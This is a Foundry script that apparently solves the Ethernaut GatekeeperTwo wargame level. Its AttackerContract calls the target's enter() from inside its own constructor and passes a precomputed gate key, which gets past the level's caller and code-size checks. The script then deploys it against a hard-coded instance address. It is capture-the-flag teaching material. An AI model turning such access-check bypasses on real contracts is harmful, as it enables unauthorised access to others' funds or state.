// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GateKeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackerContract {
    constructor (address _address) {
        GatekeeperTwo gatekeeperTwoInstance = GatekeeperTwo(_address);
        bytes8 gateKey = 0xe54b1351464c8322;

        console.log("Address : ", uint64(bytes8(keccak256(abi.encodePacked(address(this)))))); 

        gatekeeperTwoInstance.enter(gateKey);
    }
}

contract GateKeeperTwoSolution is Script {
    GatekeeperTwo public gatekeeperTwoInstance = GatekeeperTwo(0xC6Ed0c6B1474A21A6834Cb2949448d1EFe35e50E);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Player : ", vm.envAddress("MY_ADDRESS"));
        console.log("Before entrant : ", gatekeeperTwoInstance.entrant());

        new AttackerContract(address(gatekeeperTwoInstance));

        console.log("After entrant : ", gatekeeperTwoInstance.entrant());

        vm.stopBroadcast();
    }
} 